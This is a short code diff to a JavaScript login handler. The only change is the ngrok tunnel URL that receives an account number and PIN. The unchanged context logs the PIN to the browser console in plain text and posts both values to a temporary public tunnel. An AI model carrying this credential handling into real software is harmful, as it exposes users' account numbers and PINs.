@@ -7,7 +7,7 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
 
   console.log("Enviando:", { numero: cuenta, nip: nip });
 
-  fetch("https://29f7-130-131-81-210.ngrok-free.app/login", {
+  fetch("https://ca2c-130-131-81-210.ngrok-free.app/login", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
